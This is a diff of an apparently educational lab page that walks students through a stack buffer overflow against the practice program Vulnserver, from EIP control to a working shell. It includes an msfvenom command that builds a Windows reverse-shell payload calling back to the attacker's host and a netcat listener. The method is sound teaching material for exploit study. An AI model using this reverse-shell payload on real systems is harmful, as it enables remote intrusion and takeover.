@@ -64,7 +64,7 @@ Creation-Date: 2020-04-20T17:45:18-07:00
 
 		{{./screenshot_2020-04-22-201511.png}}
 		
-		5. Save your new program. Switch back to Windows, close all your programs, Immunity Debugger and Vulnserver. Now, restart Vulnserver and restart Immunity Debugger (remember as Administrator for both programs), and unpause it with the **F9 **key. Oh yeah, get used to doing this a few times. Run your python script and observer Immunity Debugger. Specifically, take a look at the EIP register. The value in EIP should be **386F4337. ** Which is part of the Pattern Create string you added to your script. 
+		5. Save your new program. Switch back to Windows, close all your programs, Immunity Debugger and Vulnserver. Now, restart Vulnserver and restart Immunity Debugger (remember as Administrator for both programs), In Immunity Debugger, click on **File **-> **Attach** and select **vulnserver.exe, **then unpause it with the **F9 **key. Oh yeah, get used to doing this a few times. Run your python script and observer Immunity Debugger. Specifically, take a look at the EIP register. The value in EIP should be **386F4337. ** Which is part of the Pattern Create string you added to your script. 
 
 		{{./screenshot_2020-04-22-202720.png}}
 		
@@ -82,7 +82,113 @@ Creation-Date: 2020-04-20T17:45:18-07:00
 		You got an exact match at 2003 bytes. That's good news becasue you can now try to take control of the EIP register.
 		
 	**Overwriting the EIP**
-		At this point we've located where the overflow crash happens, just after the 2003 bytes. Let's modify our fuzzing script to verify where that EIP register is at. The screen below shows the previous script we used, but slightly modified. Take a look:
+		At this point we've located where the overflow crash happens, just after the 2003 bytes. Let's modify our fuzzing script to verify where that EIP register is at. The screen below shows the previous script we used, but slightly modified. I created a variable called **eip** and set it equal to 2003 A's + 4 B's. The idea being that the 4 B's will overwrite the EIP register.
+
+		I named my script **3-vulnserver-eip.py**
+		{{./screenshot_2020-04-24-200814.png}}
+		
+		6. Save your new program. Switch back to Windows, close all your programs, Immunity Debugger and Vulnserver. Now, restart Vulnserver and restart Immunity Debugger (remember as Administrator for both programs), In Immunity Debugger, click on **File **-> **Attach** and select **vulnserver.exe** then unpause it with the **F9 **key. Now, execute your sctipt and watch Vulnserver crash again. What are the values in the EIP register?
+
+		{{./screenshot_2020-04-24-235254.png}}
+		
+		Yes! We verified that the EIP register is just after the 2003 bytes. It's been overwritten by the 4 B's (x42424242 in Hex).
+		
+	**Finding Bad Characters:**
+		Bad characters may be special characters that cause the program to behave unexpectedly, and will also cause the exploit code to have issues executing properly. The NULL (**\x00**) character will most likely cause issues, so we make sure not to include **\x00**. To identify which are the bad characters, we have to send the program a list of all possible characters. You can find a good souce of [[https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/|badchars here]] to copy/paste. Let's modify our fuzzing script and add a new variable called **badchars**. The screen below shows the previous script we used, but slightly modified.
+
+		I made a copy of my previous script and named it **4-vulnserver-badchars.py**
+		{{./screenshot_2020-04-25-002913.png}}
+		
+		7. Save your new program. Switch back to Windows, close all your programs, Immunity Debugger and Vulnserver. Now, restart Vulnserver and restart Immunity Debugger (remember as Administrator for both programs), In Immunity Debugger, click on **File **-> **Attach** and select **vulnserver.exe **then unpause it with the **F9 **key. Now, execute your sctipt and watch Vulnserver crash again.
+		8. After running your badchars script, locate the **ESP** register in Immunity Debugger (in the Registers pane), right click and select "**Follow in Dump**"
+		
+		Take a look at the bottom left window pane. There's 3 columns, Address, Hex Dump, ASCII. You should see all of the bytes starting at 01 02 03 04...FC FD FE FF. If a bad character were present it would be replaced with a **B0. **It doesnt appear to be any bad characters other than the NULL **x00 **character. Let's make a note of that.
+		
+		{{./screenshot_2020-04-25-003629.png}}
+		
+	**Finding the right Module**
+		Operating Systems now employ a variety of Memory Protections to help prevent malicious software from executing. Although, it is good deterant, there are techniques to bypass such protections. Data Execution Prevention (DEP), Address Space Layout Randomnization (ASLR), and SafeSEH are some of the memory protections employed by most operating systems.
+		
+		In this next step we will try to locate a module in vulnserver that does not employ any memory protections. For this, we can use the Immunity Debugger **mona **module. 
+		
+		9. Switch back to Windows, close all your programs, Immunity Debugger and Vulnserver. Now, restart Vulnserver and restart Immunity Debugger (remember as Administrator for both programs),  In Immunity Debugger, click on **File **-> **Attach** and select **vulnserver.exe **then unpause it with the **F9 **key. In the bottom search bar of Immunity Debugger, type **!mona modules **YOu should get results similar to the screenshot below.
+
+		{{./screenshot_2020-04-25-005930.png}}
+		
+		If you notice the module I highlighted in blue, it has False in every colum. This means that there is no memory protection on that module. In this case, **essfunc.dll **is a good candidate. Let's take a note of that module.
+		
+		Dont worry we're getting to the good part.
+		
+		10. Now, we need to find the opcode equivalent of a JMP ESP instruction. We can translate the Assembly Language of a JMP ESP and turn it into Hex Code. This is how we force the EIP register to point to the JMP ESP location.
+		
+		We can use a tool in Kali called **nasm_shell **to get the right information we need. Switch back to Kali and **locate nasm_shell** in your Kali machine and run it like the screenshot below.
+		{{./screenshot_2020-04-25-010916.png}}
+		
+		It looks like the JMP ESP opcode equivalent is **FFE4. **Let's use **mona **again to find that opcode in that vulnerable module we located earlier. In that module will be a pointer address that we can use to place in the EIP register to point to the malicious shellcode. Go back to Immunity Debugger searchbar and type, 
+		**!mona find -s "\xff\xe4" -m essfunc.dll**
+		{{./screenshot_2020-04-25-011934.png}}
+		
+		Notice it **found a total of 9 pointers. **The address is in the far left column. I can select the first one "**625011AF**" and use that as my pointer.
+		
+		11. Make a copy of your last python script and add the new pointer address in place of the B's. Similar to the screen shot below.
+		I named my script **5-vulnserver-shellcode.py**
+		{{./screenshot_2020-04-25-012800.png}}
+		
+		Notice how I entered the address backwards. This notation is called Little Endian notation, which is specific to x86 architecture.  In this architecture the most significant (high-order) bytes of the number are shuffled to the right. **Little Endian.**
+
+		12. Now let's find that return address in Immunity Debugger. Go back to Immunity Debugger and locate the navigation arrows and click on the far right arrow. {{./screenshot_2020-04-25-013655.png}}
+		In the Enter expression to follow input box enter, **625011AF**
+		The address should bring you to FFE4 JMP ESP. Hit the F2 key to set a breakpoint there. It should look similar to the screenshot below.
+		{{./screenshot_2020-04-25-014308.png}}
+		
+		13. Execute your script from step 11 above and see if it trigger the breakpoint. If it triggers, look over at the EIP register and notice the pointer address you enter in your script and next to it is the essfunc module.
+		{{./screenshot_2020-04-25-014617.png}}
+		
+		Looks like we are ready to develop our malicious shellcode!
+		
+	**Let's Generate Some Shellcode**
+		For this example, we can create a reverse shell using Msfvenom like in our previous labs. 
+		14. Using the following Msfvenom command we can generate a malicious payload to create a reverse shell back to our attacking machine.
+{{{code: lang="sh" linenumbers="False"
+root@kali~: msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip_address> LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b “\x00”
+}}}
+
+		
+		**What the flags mean:**
+			-p is for payload. We are using a non-staged windows reverse shell payload.
+			LHOST is the attacker's IP address.
+			LPORT is the attacker's port. 
+			EXITFUNC=thread adds stability to our payload.
+			-f is for file type. Generate a C file type here.
+			-a is for architecture. The machine we are attacking is x86.
+			–platform is for OS type. We are attacking a Windows machine.
+			-b is for bad characters. The only bad character  is the null byte, x00
+		{{./screenshot_2020-04-25-020359.png}}
+		
+		15. Now, copy/paste the shellcode portion of the output and insert it into a new variable in your last script. I called my varibale **shellcode. **Your script should look similar to the screenshot below.
+		
+		{{./screenshot_2020-04-25-022924.png}}
+		
+		Notice that I created a varibale called **exploit** where I tie together my 2003 A's, my return address, 30 \x90's, which are NOPs or NO OPERATION instructions. They dotn do anything but provide padding to ensure our shellcode runs correctly. In practice, shellcode can sometimes interfere with the return address so we can add some padding in between to make sure there's no issues.
+		Save your new script and go one to the FINAL step. Gaining Admin.
+		
+	**Got Root!**
+
+		16. Set up a netcat listener on port 4444 in your Kali terminal. 
+
+{{{code: lang="sh" linenumbers="False"
+root@kali~: nc -nvlp 4444
+}}}
+
+
+		You can now shut down Immunity Debugger and Start up Vulnserver as Administrator.
+		**Execute your script and get a shell.**
+		
+		{{./screenshot_2020-04-25-023119.png}}
 		
 
+		If you got a shell, take a screenshot like the one above and submit to Canvas using the link below.
+
 	**Submission Link**
+		https://mpc.instructure.com/courses/12188/assignments/150693
+
